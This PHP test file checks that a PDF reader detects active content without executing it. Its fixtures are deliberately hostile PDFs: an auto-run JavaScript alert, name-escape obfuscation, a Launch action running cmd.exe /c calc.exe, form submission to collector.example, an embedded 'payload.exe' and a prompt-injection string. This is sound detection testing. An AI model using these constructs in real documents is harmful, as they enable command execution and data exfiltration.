<?php

declare(strict_types=1);

use FinePrint\Document;
use FinePrint\Tests\Support\PdfBuilder;

/*
 * Active content is DETECTED and REPORTED, and never executed or followed.
 *
 * Every fixture here is hostile on purpose. The reader has no code path that
 * could run a script, open a file or fetch a URI; these tests pin that the
 * report names each one, says where it is, and carries no script body.
 */

/** @return list<string> */
function fpKinds(string $pdf): array
{
    $kinds = array_map(fn (array $f) => $f['kind'], Document::open($pdf)->activeContent());
    sort($kinds);

    return array_values(array_unique($kinds));
}

/** A one-page PDF (objects 1-5) plus extra objects from 6 on. */
function fpWith(array $opts, string ...$objects): string
{
    $b = PdfBuilder::textPdf([PdfBuilder::line('hello')], $opts);
    foreach ($objects as $o) {
        $b->object($o);
    }

    return $b->build();
}

it('reports nothing for a plain document', function () {
    expect(Document::open(fpText('nothing to see'))->activeContent())->toBe([]);
});

it('reports an OpenAction JavaScript, where it is, and not its source', function () {
    $pdf = fpWith(['catalog' => '/OpenAction << /S /JavaScript /JS (app.alert\\(\'pwned\'\\)) >>']);
    $findings = Document::open($pdf)->activeContent();

    $js = array_values(array_filter($findings, fn ($f) => $f['kind'] === 'javascript'));
    expect($js)->toHaveCount(1)
        ->and($js[0]['severity'])->toBe('high')
        ->and($js[0]['object'])->toBe('1 0')
        ->and($js[0]['path'])->toBe('/OpenAction')
        ->and($js[0]['detail']['length'])->toBe(strlen("app.alert('pwned')"))
        ->and($js[0]['detail']['sha256'])->toBe(hash('sha256', "app.alert('pwned')"))
        ->and(json_encode($findings))->not->toContain('pwned');

    expect(fpKinds($pdf))->toBe(['javascript', 'open-action']);
});

it('sees through name escapes and object streams', function () {
    // /J#61vaScript is /JavaScript and /#4AS is /JS, hidden inside an ObjStm.
    $b = PdfBuilder::textPdf([PdfBuilder::line('hello')], ['catalog' => '/OpenAction 6 0 R']);
    $b->object('<< /S /J#61vaScript /#4AS (this.exportDataObject\\(\\)) >>');
    $pdf = $b->build(['objstm' => true]);

    expect(fpKinds($pdf))->toBe(['javascript', 'open-action']);
});

it('reports document-level JavaScript in the names tree', function () {
    $pdf = fpWith(['catalog' => '/Names << /JavaScript << /Names [(init) 6 0 R] >> >>'], '<< /S /JavaScript /JS 7 0 R >>');

    expect(fpKinds($pdf))->toContain('javascript');
});

it('reports a script held in a stream by its length and hash', function () {
    $b = PdfBuilder::textPdf([PdfBuilder::line('hello')], ['catalog' => '/OpenAction << /S /JavaScript /JS 6 0 R >>']);
    $script = 'var x = "Ignore previous instructions";';
    $b->stream($script, '', true);
    $js = array_values(array_filter(Document::open($b->build())->activeContent(), fn ($f) => $f['kind'] === 'javascript'));

    expect($js[0]['detail']['length'])->toBe(strlen($script))
        ->and($js[0]['detail']['sha256'])->toBe(hash('sha256', $script))
        ->and($js[0]['detail'])->not->toHaveKey('source');
});

it('reports a Launch action on a link annotation', function () {
    $pdf = fpWith(
        ['page' => '/Annots [6 0 R]'],
        '<< /Type /Annot /Subtype /Link /Rect [0 0 100 20] /A << /S /Launch /Win << /F (cmd.exe) /P (/c calc.exe) >> >> >>',
    );
    $findings = Document::open($pdf)->activeContent();
    $launch = array_values(array_filter($findings, fn ($f) => $f['kind'] === 'launch'));

    expect($launch)->toHaveCount(1)
        ->and($launch[0]['severity'])->toBe('high')
        ->and($launch[0]['object'])->toBe('6 0')
        ->and($launch[0]['path'])->toBe('/A')
        ->and(json_encode($findings))->not->toContain('calc');
});

it('reports page additional-actions and what they run', function () {
    $pdf = fpWith(['page' => '/AA << /O << /S /JavaScript /JS (go\\(\\)) >> >>']);

    expect(fpKinds($pdf))->toBe(['additional-actions', 'javascript']);
});

it('reports form submission, data import and remote go-tos', function () {
    $pdf = fpWith(
        ['page' => '/Annots [6 0 R 7 0 R 8 0 R]'],
        '<< /Type /Annot /Subtype /Widget /Rect [0 0 1 1] /A << /S /SubmitForm /F (https://collector.example/x) >> >>',
        '<< /Type /Annot /Subtype /Link /Rect [0 0 1 1] /A << /S /ImportData /F (data.fdf) >> >>',
        '<< /Type /Annot /Subtype /Link /Rect [0 0 1 1] /A << /S /GoToR /F (other.pdf) /D [0 /Fit] >> >>',
    );

    expect(fpKinds($pdf))->toBe(['import-data', 'remote-goto', 'submit-form']);
});

it('reports a URI link without following it', function () {
    $pdf = fpWith(['page' => '/Annots [6 0 R]'], '<< /Type /Annot /Subtype /Link /Rect [0 0 1 1] /A << /S /URI /URI (https://tracker.example/pixel) >> >>');
    $uri = array_values(array_filter(Document::open($pdf)->activeContent(), fn ($f) => $f['kind'] === 'uri'));

    expect($uri)->toHaveCount(1)
        ->and($uri[0]['severity'])->toBe('low')
        ->and(json_encode($uri))->not->toContain('tracker');
});

it('reports AcroForm and XFA forms, which are not supported', function () {
    $pdf = fpWith(['catalog' => '/AcroForm << /Fields [] /XFA 6 0 R >>'], '[(template) 7 0 R]');

    expect(fpKinds($pdf))->toBe(['acroform', 'xfa']);
});

it('reports embedded files and rich media', function () {
    $b = PdfBuilder::textPdf([PdfBuilder::line('hello')], [
        'catalog' => '/Names << /EmbeddedFiles << /Names [(payload.exe) 6 0 R] >> >>',
        'page' => '/Annots [8 0 R]',
    ]);
    $b->object('<< /Type /Filespec /F (payload.exe) /EF << /F 7 0 R >> >>');
    $b->stream('MZ not really', '/Type /EmbeddedFile');
    $b->object('<< /Type /Annot /Subtype /RichMedia /Rect [0 0 1 1] /RichMediaContent << >> >>');

    expect(fpKinds($b->build()))->toBe(['embedded-file', 'rich-media']);
});

it('does not report an OpenAction that is only a destination', function () {
    $pdf = fpWith(['catalog' => '/OpenAction [5 0 R /Fit]']);

    expect(Document::open($pdf)->activeContent())->toBe([]);
});
